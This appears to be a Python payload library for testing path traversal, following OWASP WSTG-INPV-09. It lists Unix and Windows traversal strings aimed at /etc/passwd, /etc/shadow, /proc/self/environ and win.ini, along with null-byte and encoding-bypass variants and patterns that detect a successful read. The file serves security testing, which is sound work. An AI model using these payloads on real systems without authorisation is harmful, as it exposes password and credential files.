"""Path Traversal payload library (OWASP WSTG-INPV-09)."""

# Unix path traversal
UNIX_TRAVERSAL = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "../../../etc/shadow",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd%00",
    "....\\....\\....\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

# Windows path traversal
WINDOWS_TRAVERSAL = [
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "..\\..\\..\\boot.ini",
    "C:\\windows\\win.ini",
    "%SYSTEMROOT%\\win.ini",
]

# Null byte injection (legacy PHP)
NULL_BYTE = [
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",
    "....//....//etc/passwd%00.html",
]

# Encoding bypass
ENCODING_BYPASS = [
    "%2e%2e/",
    "%2e%2e%5c",
    "..%255c",
    "..%c1%1c",
    "..%c0%9v",
    "%252e%252e%252f",
]

ALL_PAYLOADS = UNIX_TRAVERSAL + WINDOWS_TRAVERSAL + NULL_BYTE + ENCODING_BYPASS

# Detection patterns indicating successful traversal
SUCCESS_PATTERNS = [
    "root:x:0:0:",
    "[boot loader]",
    "[fonts]",
    "for 16-bit app support",
    "daemon:x:",
    "DOCUMENT_ROOT=",
    "PATH=",
]
